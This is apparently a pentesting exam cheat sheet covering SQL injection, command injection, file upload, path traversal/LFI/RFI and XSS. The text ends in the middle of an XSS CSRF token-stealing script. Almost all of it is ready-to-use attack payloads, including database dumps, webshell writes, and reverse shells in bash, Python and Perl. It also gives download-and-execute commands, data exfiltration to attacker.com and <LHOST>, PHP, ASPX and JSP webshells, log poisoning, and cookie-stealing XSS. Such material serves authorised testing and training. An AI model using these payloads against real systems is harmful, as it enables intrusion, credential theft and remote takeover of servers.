### 3.2 SQL Injection (Manual Testing First)

> üìñ **Reference**: [SQL Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)

**üéØ Initial Probing Payloads:**

```sql
' 
" 
'-- 
"-- 
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
" OR "1"="1"--
' OR 1=1--
" OR 1=1--
admin'--
admin"--
admin' OR '1'='1
admin' OR 1=1--
admin") OR ("1"="1
1' AND 1=1--
1' AND 1=2--
1' OR '1'='1
OR 1=1--
' UNION SELECT NULL--
```

**üîç Observation Points:**

- Error messages revealing DB structure (MySQL, MSSQL, PostgreSQL)
- Content changes with true/false conditions
- Response time differences (Time-based SQLi)
- Different behavior between `1=1` (true) and `1=2` (false) conditions
- Blank pages or different content lengths
- Database-specific error messages

**üß™ Union-Based Testing (Column Discovery):**

```sql
# Discover number of columns
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL,NULL--

# Alternative: ORDER BY method
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
# Continue until error reveals column count

# Test which columns contain text
1' UNION SELECT 'a',NULL,NULL--
1' UNION SELECT NULL,'a',NULL--
1' UNION SELECT NULL,NULL,'a'--
```

**üìä Data Extraction (When Confirmed):**

**MySQL:**

```sql
# Version
' UNION SELECT NULL,@@version,NULL--
-1 UNION SELECT NULL,@@version,NULL--
' UNION SELECT @@version,NULL--

# Current database name
' UNION SELECT NULL,database(),NULL--
' UNION SELECT database()--

# Current user
' UNION SELECT NULL,user(),NULL--
' UNION SELECT NULL,current_user(),NULL--

# List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--

# List tables in current database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();#

# List columns in specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--
-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users';#

# Dump data from specific table
-1 UNION SELECT 1,2,group_concat(username,':',password) FROM users;#
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Read files (requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
-1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--

# Write webshell (requires FILE privilege and write permissions)
' UNION SELECT NULL,"<?php system($_GET['cmd']);?>",NULL INTO OUTFILE "/var/www/html/shell.php"--
-1 UNION SELECT 1,"<?php system($_GET['cmd']);?>",3 INTO OUTFILE "/var/www/html/shell.php"--

# Bypass filters with comments
' UN/**/ION SE/**/LECT NULL,database()--
```

**MSSQL:**

```sql
# Authentication bypass
' OR 1=1--
admin'--
' OR '1'='1'--

# Version detection (time-based)
'; IF (SELECT @@version) LIKE '%2019%' WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--

# Get version
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT @@version,NULL--

# Current database
' UNION SELECT NULL,DB_NAME(),NULL--

# List databases
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT name FROM master..sysdatabases--

# List tables in current database
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

# List columns in specific table
' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

# Current user
' UNION SELECT NULL,SYSTEM_USER,NULL--
' UNION SELECT NULL,USER_NAME(),NULL--

# Enable xp_cmdshell (requires sysadmin)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# Execute commands via xp_cmdshell
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://<LHOST>/shell.ps1'')"';--

# Read files
' UNION SELECT NULL,BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
```

**PostgreSQL:**

```sql
# Version
' UNION SELECT NULL,version(),NULL--

# Current database
' UNION SELECT NULL,current_database(),NULL--

# Current user
' UNION SELECT NULL,current_user,NULL--

# List databases
' UNION SELECT NULL,datname,NULL FROM pg_database--

# List tables in current database
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--

# List columns in specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Dump data
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Command execution (requires superuser)
'; COPY (SELECT '') TO PROGRAM 'id';--
'; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;--

# Read files (requires superuser)
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,1000000),NULL--
```

**SQLite:**

```sql
# List tables
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'--

# List columns (from CREATE statement)
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--

# Dump data
' UNION SELECT NULL,group_concat(username || ':' || password),NULL FROM users--

# SQLite version
' UNION SELECT NULL,sqlite_version(),NULL--
```

**Oracle:**

```sql
# Version
' UNION SELECT NULL,banner,NULL FROM v$version--

# Current user
' UNION SELECT NULL,user,NULL FROM dual--

# List tables
' UNION SELECT NULL,table_name,NULL FROM all_tables--

# List columns
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# Note: Oracle requires FROM clause, use "dual" dummy table
```

**üïí Time-Based Blind SQL Injection:**

```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;--
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END;--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

**üî® Boolean-Based Blind SQL Injection:**

```sql
# Check if first character of database name is 'a'
' AND SUBSTRING(database(),1,1)='a'--

# ASCII comparison (bruteforce each character)
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))=109--

# Check table existence
' AND (SELECT COUNT(*) FROM users)>0--
' AND EXISTS(SELECT * FROM users)--

# Extract data character by character
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

**‚ö†Ô∏è Note About SQLMap:**

> SQLmap is **often prohibited** in pentesting exams. Always use manual techniques above for exam scenarios. SQLmap can be used in practice environments:

```bash
# Basic detection
sqlmap -u "http://<RHOST>/product.php?id=1" --batch

# Database enumeration
sqlmap -u "http://<RHOST>/product.php?id=1" --batch --dbs

# Tables in specific database
sqlmap -u "http://<RHOST>/product.php?id=1" -D webapp_db --tables

# Dump specific table
sqlmap -u "http://<RHOST>/product.php?id=1" -D webapp_db -T users --dump

# Dump all databases
sqlmap -u "http://<RHOST>/product.php?id=1" --dump-all --exclude-sysdbs

# POST request
sqlmap -u "http://<RHOST>/login.php" --data="username=admin&password=pass" --level=5 --risk=3

# With cookie authentication
sqlmap -u "http://<RHOST>/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

# From Burp request file
sqlmap -r request.txt --batch

# OS shell (if privileges allow)
sqlmap -u "http://<RHOST>/product.php?id=1" --os-shell

# Read file
sqlmap -u "http://<RHOST>/product.php?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://<RHOST>/product.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 3.3 Command Injection

> üìñ **Reference**: [Command Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)

**üéØ Test Payloads:**

```bash
# Semicolon separator
; id
; whoami
; ls
; pwd

# Pipe operator
| id
| whoami
| ls -la

# Logic operators
&& id
&& whoami
|| id
|| whoami
& id
& whoami

# Command substitution
`id`
$(id)
`whoami`
$(whoami)
`ls -la`
$(ls -la)

# Newline injection
%0aid
%0awhoami

# Full command injection examples
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
&& cat /etc/passwd

# Reverse shell injection
; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
| bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

# Python reverse shell
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Perl reverse shell
; perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows command injection
& whoami
| whoami
|| whoami
; whoami
%0awhoami
`whoami`
& dir
| ipconfig
& net user
```

**‚è±Ô∏è Blind Injection Detection (Time-Based):**

```bash
# Sleep commands (Linux)
; sleep 5
& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; sleep 10 &

# Ping based (works on both Windows/Linux)
; ping -c 10 127.0.0.1
& ping -c 10 127.0.0.1
| ping -n 10 127.0.0.1  # Windows

# Time calculation to verify
; date; sleep 5; date

# Timeout command (Windows)
& timeout /t 5
| timeout /t 5
```

**üîç Out-of-Band Detection (OOB):**

```bash
# DNS exfiltration (use Burp Collaborator or interactsh)
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
| host $(whoami).attacker.com

# HTTP callback
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/callback?data=$(id | base64)
| curl http://attacker.com/?data=$(hostname)

# SMB callback (Windows)
& certutil.exe -urlcache -split -f http://attacker.com/test
& net use \\attacker.com\share
```

**üõ°Ô∏è Bypass Techniques:**

```bash
# Space bypass
${IFS}
$IFS$9
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Command alternatives
# cat -> tac, nl, more, less, head, tail
tac /etc/passwd
nl /etc/passwd
more /etc/passwd

# Keyword filtering bypass
c''at /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
\c\a\t /etc/passwd

# Quote bypass
'w'h'o'a'm'i'
"w"h"o"a"m"i"
w''ho''am''i

# Wildcard bypass
/???/n? -? 127.0.0.1  # /bin/nc
/???/?s /  # /bin/ls
/???/?? /???/??ss??  # /bin/cat /etc/passwd

# Hex encoding
$(echo 636174202f6574632f706173737764 | xxd -r -p)  # cat /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash  # cat /etc/passwd

# Variable expansion
a=c;b=at;$a$b /etc/passwd
```

**ü™ü Windows-Specific Payloads:**

```cmd
# Basic commands
& whoami
| whoami
& hostname
& ipconfig
& net user
& net localgroup administrators

# List files
& dir
& dir C:\
& type C:\Windows\System32\drivers\etc\hosts

# PowerShell download and execute
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/shell.ps1')"
& powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/shell.ps1')"

# Certutil download
& certutil -urlcache -f http://<LHOST>/nc.exe nc.exe
& nc.exe <LHOST> <LPORT> -e cmd.exe
```

### 3.4 File Upload Vulnerabilities

> üìñ **Reference**: [Upload Insecure Files - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)

**üéØ Test Sequence:**

1. Upload harmless file (`.txt`, `.jpg`) - establish baseline
2. Test content-type bypass
3. Test extension bypass
4. Test magic number bypass
5. Test polyglot files
6. Test file content validation

**üîß Extension Bypass Techniques:**

```bash
# Double extension
shell.php.jpg
shell.php.png
shell.jpg.php
shell.png.php
shell.asp.jpg
shell.aspx.png

# Null byte (older systems, PHP < 5.3)
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
shell.asp%00.jpg

# Case manipulation
shell.PhP
shell.pHp
shell.PHP
shell.Php5
shell.AsP
shell.AsPx

# Trailing characters
shell.php.....
shell.php%20
shell.php%0a
shell.php%00
shell.php%0d%0a
shell.php/
shell.php.\

# Windows NTFS Alternate Data Stream
shell.php::$DATA
shell.asp::$DATA

# Alternative PHP extensions
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtm
shell.phtml
shell.phps
shell.phar
shell.pgif
shell.shtml
shell.inc

# ASP/ASPX alternatives
shell.asp
shell.aspx
shell.cer
shell.asa
shell.asax
shell.ascx
shell.ashx
shell.asmx
shell.axd
shell.config
shell.compiled

# JSP alternatives
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf
shell.wss

# Other executable extensions
shell.pl
shell.py
shell.rb
shell.cgi
```

**üé® Content-Type Bypass:**

```bash
# Capture upload request in Burp Suite and modify Content-Type:

# Original (blocked)
Content-Type: application/x-php

# Bypass attempts
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream
```

**üîÆ Magic Number/Signature Bypass (Polyglot Files):**

```bash
# Add magic bytes to beginning of PHP file

# GIF header + PHP
GIF89a;
<?php system($_GET['cmd']); ?>

# GIF header (hexadecimal)
GIF89a<?php system($_GET['cmd']); ?>

# PNG header + PHP
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x03H\x00\x00\x01\xF4\x08\x06
<?php system($_GET['cmd']); ?>

# JPEG header + PHP
\xff\xd8\xff\xe0
<?php system($_GET['cmd']); ?>

# PDF header + PHP
%PDF-1.5
<?php system($_GET['cmd']); ?>
```

**üß© Creating Polyglot Files:**

```bash
# Method 1: Using exiftool (inject PHP into image metadata)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# Method 2: Manual GIF polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Method 3: Prepend magic bytes to PHP shell
printf '\xff\xd8\xff\xe0' > shell.php
cat phpshell.php >> shell.php

# View metadata
exiftool shell.php.jpg
file shell.php.jpg
```

**üåê Common Upload Locations to Test:**

```
/uploads/
/upload/
/files/
/file/
/images/
/image/
/media/
/assets/
/static/
/content/
/tmp/
/temp/
/user_uploads/
/profile_images/
/attachments/
/documents/
/downloads/
```

**üß™ PHP Shell Examples:**

```php
# Simple PHP shell
<?php system($_GET['cmd']); ?>

# One-liner shell
<?php echo shell_exec($_GET['cmd']); ?>

# Ultra-minimal shell
<?=`$_GET[0]`?>

# Short tags
<? system($_GET['cmd']); ?>

# Alternative functions #1
<?php passthru($_GET['cmd']); ?>

# Alternative functions #2
<?php exec($_GET['cmd']); ?>

# Alternative functions #3
<?php shell_exec($_GET['cmd']); ?>

# Alternative functions #4
<?=$_GET[0]($_GET[1]);?>

# More robust shell with output
<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

# Obfuscated shell
<?php $a=$_GET['a'];$b=$_GET['b'];$a($b); ?>
# Usage: shell.php?a=system&b=whoami

# Using assert (older PHP)
<?php assert($_GET['cmd']); ?>

# Using preg_replace (PHP < 5.5)
<?php preg_replace('/.*/e', $_GET['cmd'], ''); ?>

# File upload + execution
<?php
if($_FILES){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
?>
```

**ü™ü ASP/ASPX Shell Examples:**

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Response.Write("<pre>");
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
    Response.Write("</pre>");
}
</script>
```

**‚òï JSP Shell Example:**

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int a;
    while((a = in.read()) != -1) {
        out.print((char)a);
    }
%>
```

### 3.5 Path Traversal and LFI/RFI

> üìñ **References**:
> 
> - [File Inclusion - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
> - [Directory Traversal - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)

**üîç Basic Traversal Tests:**

```text
# Standard traversal (Linux)
../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd

# Windows traversal
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini

# URL encoded (single encoding)
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2Fwindows%2Fwin.ini

# URL encoded (double encoding)
..%252F..%252F..%252Fetc%252Fpasswd

# Different encoding types
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%e0%80%af..%e0%80%afetc%e0%80%afpasswd

# Path bypass with dots
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd

# Unicode/UTF-8 encoding
..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Null byte (older PHP < 5.3)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd\x00

# Absolute paths
/etc/passwd
/etc/shadow
/var/www/html/index.php
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\inetpub\wwwroot\web.config

# Mixed slashes
..\/..\/..\/etc/passwd
....\/\/....\/\/etc/passwd
```

**üß© PHP Wrappers (LFI to RCE):**

```text
# php://filter - Base64 encode source code
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/var/www/html/admin.php

# Read and decode:
echo "BASE64_OUTPUT" | base64 -d

# Different encodings
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# php://input - Execute PHP code via POST data
php://input
# POST data: <?php system('id'); ?>
# POST data: <?php system($_GET['cmd']); ?>

# Usage with curl
curl -X POST "http://<RHOST>/index.php?page=php://input" -d "<?php system('id'); ?>"
curl -X POST "http://<RHOST>/index.php?page=php://input" -d "<?php system(\$_GET['cmd']); ?>" -G --data-urlencode "cmd=whoami"

# data:// wrapper - Execute PHP code inline
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Base64 encode payload
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Result: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Usage
http://<RHOST>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id

# expect:// wrapper (if expect extension installed - rare)
expect://id
expect://ls
expect://whoami

# Usage
http://<RHOST>/index.php?page=expect://id

# zip:// wrapper
zip://archive.zip#shell.php
zip:///path/to/archive.zip#shell.php

# phar:// wrapper
phar://shell.phar/shell.php
phar:///path/to/shell.phar/shell.php

# Create phar archive
# 1. Create shell.php
# 2. Create phar: php -r '$phar = new Phar("shell.phar"); $phar->addFile("shell.php"); $phar->stopBuffering();'
# 3. Upload shell.phar
# 4. Access: ?page=phar://shell.phar/shell.php
```

**üîó PHP Filter Chain Generator (LFI to RCE without File Upload):**

> üìñ **Tool**: [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)

```bash
# Install
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# Generate filter chain for command execution
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'

# Output will be a long php://filter chain

# Use generated chain
curl "http://<RHOST>/index.php?page=php://filter/convert.iconv...<GENERATED_CHAIN>...php://temp&0=id"

# Generate reverse shell chain
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>"

# Save to file for easy use
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>' | grep "^php" > payload.txt

# Execute with curl
curl "http://<RHOST>/index.php?file=$(cat payload.txt)&0=whoami"
```

**üîç Common Files to Target (Linux):**

```
# Password files
/etc/passwd
/etc/shadow
/etc/group
/etc/security/passwd
/etc/security/group

# System info
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/etc/lsb-release
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/stat
/proc/self/status

# Web server configs
/etc/apache2/apache2.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/etc/apache22/httpd.conf

# Database configs
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/lib/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH configs and keys
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/root/.ssh/id_rsa
/root/.ssh/id_dsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/id_dsa
/home/user/.ssh/authorized_keys
/home/user/.ssh/known_hosts

# Shell history
/root/.bash_history
/root/.zsh_history
/home/user/.bash_history
/home/user/.zsh_history

# Logs (for log poisoning)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/messages
/var/log/secure
/var/log/mail.log
/var/log/vsftpd.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Mail
/var/mail/root
/var/mail/www-data
/var/spool/mail/root
/var/spool/mail/www-data

# Cron
/etc/crontab
/etc/cron.d/*
/var/spool/cron/crontabs/root

# Application files
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
```

**üîç Common Files to Target (Windows):**

```
# System files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini

# IIS configs
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Apache/XAMPP (Windows)
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\mysql\bin\my.ini
C:\xampp\phpMyAdmin\config.inc.php

# Installation/Setup logs
C:\Windows\debug\NetSetup.log
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml

# User files
C:\Users\Administrator\Desktop\
C:\Users\Administrator\Documents\
C:\Users\Administrator\AppData\Roaming\
C:\Users\Public\Desktop\
```

**üéØ Web Application Specific Files:**

```
# PHP configs
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/configuration.php
/var/www/html/settings.php
/var/www/html/db_config.php
/var/www/html/database.php

# WordPress
../../../../wp-config.php
/var/www/html/wp-config.php
/var/www/html/wp-content/plugins/
/var/www/html/wp-includes/version.php
/var/www/html/wp-admin/

# Drupal
/var/www/html/sites/default/settings.php

# Joomla
/var/www/html/configuration.php

# Session files (for Session hijacking)
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
```

**üíâ Log Poisoning (LFI to RCE):**

```bash
# Apache access.log poisoning via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://<RHOST>/
curl -A "<?php system(\$_GET['c']); ?>" http://<RHOST>/test.php

# Then include the log file
curl "http://<RHOST>/index.php?page=/var/log/apache2/access.log&cmd=id"
curl "http://<RHOST>/index.php?page=../../../var/log/apache2/access.log&c=whoami"

# Nginx log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://<RHOST>/
curl "http://<RHOST>/index.php?page=/var/log/nginx/access.log&cmd=id"

# Poison via Referer header
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://<RHOST>/

# SSH log poisoning (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@<RHOST>
# Then include /var/log/auth.log

# Mail log poisoning
telnet <RHOST> 25
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: root
DATA
test
.
QUIT

# Then include /var/mail/www-data or /var/log/mail.log
curl "http://<RHOST>/index.php?page=/var/log/mail.log&cmd=id"

# FTP log poisoning
ftp <RHOST>
USER <?php system($_GET['cmd']); ?>
# Then include /var/log/vsftpd.log
```

**üîó Remote File Inclusion (RFI):**

```text
# Basic RFI (when allow_url_include=On in php.ini)
http://<RHOST>/index.php?page=http://attacker.com/shell.txt
http://<RHOST>/index.php?page=http://<LHOST>/shell.php

# With null byte (older PHP)
http://<RHOST>/index.php?page=http://attacker.com/shell.txt%00

# SMB share (Windows targets)
http://<RHOST>/index.php?page=\\attacker.com\share\shell.php
http://<RHOST>/index.php?page=\\<LHOST>\share\shell.php

# FTP protocol
http://<RHOST>/index.php?page=ftp://attacker.com/shell.txt
http://<RHOST>/index.php?page=ftp://<LHOST>/shell.txt

# Setting up simple HTTP server for RFI
python3 -m http.server 80
php -S 0.0.0.0:80

# Shell content (shell.txt)
<?php system($_GET['cmd']); ?>
```


### 3.6 XSS (Cross-Site Scripting)

> üìñ **Reference**: [XSS Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)

**üéØ Basic XSS Test Payloads:**

```html
# Simple alert tests 
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>

# IMG tag 
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.domain)>
<img/src=x onerror=alert(1)>

# SVG 
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>

# Body tag 
<body onload=alert(1)>
<body onpageshow=alert(1)>

# Input tags 
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<select onfocus=alert(1) autofocus>

# Other HTML5 tags 
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**üîß Filter Bypass Techniques:**

```html
# Case variation 
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

# String concatenation 
<script>alert('XS'+'S')</script>
<script>alert(String.fromCharCode(88,83,83))</script>

# Encoding bypasses 
<script>alert(1)</script>  # URL encoded 
<script>alert(1)</script>  # Double URL encoded 
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">  # HTML entities 

# Without parentheses 
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

# Without quotes 
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>

# Without "alert" keyword 
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval('al'+'ert(1)')</script>
<script>Function('al'+'ert(1)')()</script>

# Using alternative tags 
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>

# Spaces bypass 
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

# Comment breaking 
<!<script>alert(1)</script>
--!><script>alert(1)</script><!--
```

**üç™ Cookie Stealing:**

```html
# Basic cookie exfiltration 
<script>document.location='http://<LHOST>/?c='+document.cookie</script>
<script>fetch('http://<LHOST>/?c='+document.cookie)</script>
<script>new Image().src='http://<LHOST>/?c='+document.cookie</script>

# Using XMLHttpRequest 
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','http://<LHOST>/?c='+document.cookie);
xhr.send();
</script>

# Set up listener 
nc -lvnp 80
python3 -m http.server 80
```

**üîç DOM-Based XSS:**

```javascript
// Vulnerable code example
document.write(location.hash.substring(1));

// Exploit
http://victim.com/#<script>alert(1)</script>

// Another vulnerable pattern
eval(location.hash.substring(1));

// Exploit
http://victim.com/#alert(1)

// innerHTML injection
element.innerHTML = userInput;

// Exploit with user input
<img src=x onerror=alert(1)>
```

**üì§ XSS to Account Takeover:**

```html
# CSRF token stealing 
<script>
var token = document.getElementsByName('csrf_token')[0].value;
